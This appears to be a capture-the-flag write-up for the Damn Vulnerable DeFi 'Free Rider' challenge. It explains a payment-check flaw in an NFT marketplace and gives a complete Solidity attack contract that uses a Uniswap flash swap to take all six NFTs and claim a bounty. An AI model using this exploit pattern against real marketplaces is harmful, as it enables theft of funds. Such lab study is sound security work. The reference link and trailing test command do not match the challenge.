# FreeRider CTF Writeup

## Challenge Description
A new marketplace of Damn Valuable NFTs has been released! There’s been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.

A critical vulnerability has been reported, claiming that all tokens can be taken. Yet the developers don’t know how to save them!

They’re offering a bounty of 45 ETH for whoever is willing to take the NFTs out and send them their way. The recovery process is managed by a dedicated smart contract.

You’ve agreed to help. Although, you only have 0.1 ETH in balance. The devs just won’t reply to your messages asking for more.

If only you could get free ETH, at least for an instant.

## The Exploit Strategy
In FreeRiderNFTMarketPlace contract there are two vulns. in buyMany function there is no check for msg.value with price and in buyOne function contract returning whole amount rather than remaining of msg.value from price to msg.sender 

Here’s how the exploit unfolds step by step:

1. take the flashloan from uniswap with 15 weth as price of nFT is 15 eth 
2. in unswapV2Call(hook call) get eth from weth using weth tokens and initiate call for buyManyFunction with 6 NFT id array with 15 eth(1 NFT value is 15 ether)
3. get biunty by trnasfering all NFTs to recoveryManager and repay the flashloan
4. after all this stuff transfer all eth to player 
## Solution

```solidity
    function test_freeRider() public checkSolvedByPlayer {
        // Deploy the attack contract
        Attack attack = new Attack(recoveryManager, nft, marketplace, uniswapPair, weth);

        // Execute the attack
        attack.attack();
    }
```
```solidity
contract Attack {
    FreeRiderRecoveryManager public recoveryManager;
    DamnValuableNFT public nft;
    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;

    // Initial reserves for the Uniswap V2 pool
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    WETH weth;
    address public owner;

    constructor(
        FreeRiderRecoveryManager _recoveryManager,
        DamnValuableNFT _nft,
        FreeRiderNFTMarketplace _marketplace,
        IUniswapV2Pair _uniswapPair,
        WETH _weth
    ) {
        recoveryManager = _recoveryManager;
        nft = _nft;
        marketplace = _marketplace;
        uniswapPair = _uniswapPair;
        weth = _weth;
        owner = msg.sender;
    }

    function attack() public {
        // uniswapV2
        // uniswapPair = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        uniswapPair.swap(NFT_PRICE, 0, address(this), new bytes(1));
        (bool res,) = owner.call{value: address(this).balance}("");
        require(res, "Transfer failed.");
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        // Extract all ETH from the marketplace
        // marketplace.buyMany{value: 15 ether}([0,1,2,3,4,5]);
        weth.withdraw(weth.balanceOf(address(this)));
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < ids.length; ++i) {
            ids[i] = i;
        }
        console.log("balance of attack before :", address(this).balance);
        marketplace.buyMany{value: NFT_PRICE}(ids);
        console.log("balance of attack after buy many :", address(this).balance);

        for (uint256 i = 0; i < ids.length; ++i) {
            nft.safeTransferFrom(address(this),address(recoveryManager), i, abi.encodePacked(bytes32(uint256(uint160(address(this))))));
            
        }

        console.log("balance of attack after transfer :", address(this).balance);

        console.log("owner of 0: %s", nft.ownerOf(0));
        console.log("owner of q: %s", nft.ownerOf(1));

        console.log("owner of 2: %s", nft.ownerOf(2));

        weth.deposit{value: NFT_PRICE + 1 ether}();
        weth.transfer(address(uniswapPair), NFT_PRICE + 1 ether);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
//90_000_000_000_000_000_000
```




## References
- [Solution Link](https://docs.soliditylang.org/)
- [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/)

 forge test --mp test/selfie/Selfie.t.sol -vvvv




